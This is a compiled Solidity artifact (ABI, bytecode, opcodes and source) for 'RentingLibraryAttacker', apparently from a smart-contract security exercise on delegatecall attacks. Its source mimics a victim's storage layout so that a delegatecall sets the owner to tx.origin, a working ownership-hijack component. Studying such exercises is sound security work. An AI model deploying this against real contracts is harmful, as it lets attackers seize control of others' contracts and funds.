{
  "abi": [
    {
      "inputs": [],
      "name": "currentRenter",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_renterId",
          "type": "uint256"
        }
      ],
      "name": "setCurrentRenter",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "608060405234801561001057600080fd5b5060f78061001f6000396000f3fe6080604052348015600f57600080fd5b5060043610603c5760003560e01c8063242f17a91460415780632c69f71214605c5780638da5cb5b146080575b600080fd5b604960005481565b6040519081526020015b60405180910390f35b607e606736600460a9565b600055600180546001600160a01b03191632179055565b005b6001546092906001600160a01b031681565b6040516001600160a01b0390911681526020016053565b60006020828403121560ba57600080fd5b503591905056fea264697066735822122095edd3797d13ec98d61708630cf39bcab0e24822d0810a4946064e8a1aafeb4d64736f6c634300080d0033",
  "bytecodeSha1": "19b323be900a7bf363a394574bb38bb8da806249",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.13+commit.abaa5c0e"
  },
  "contractName": "RentingLibraryAttacker",
  "language": "Solidity",
  "natspec": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x3C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x242F17A9 EQ PUSH1 0x41 JUMPI DUP1 PUSH4 0x2C69F712 EQ PUSH1 0x5C JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH1 0x80 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x49 PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x7E PUSH1 0x67 CALLDATASIZE PUSH1 0x4 PUSH1 0xA9 JUMP JUMPDEST PUSH1 0x0 SSTORE PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND ORIGIN OR SWAP1 SSTORE JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x92 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x53 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH1 0xBA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP6 0xED 0xD3 PUSH26 0x7D13EC98D61708630CF39BCAB0E24822D0810A4946064E8A1AAF 0xEB 0x4D PUSH5 0x736F6C6343 STOP ADDMOD 0xD STOP CALLER ",
  "sha1": "fd950461e8f73ab96af10a9644d193493f37ad75",
  "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\ncontract RentingLibraryAttacker {\n    uint256 public currentRenter;\n    address public owner;\n\n\n    function setCurrentRenter(uint256 _renterId) public {\n        currentRenter = _renterId;\n        owner = tx.origin;\n    }\n}",
  "sourcePath": "contracts/call-attacks-2/RentingLibraryAttacker.sol",
  "type": "contract"
}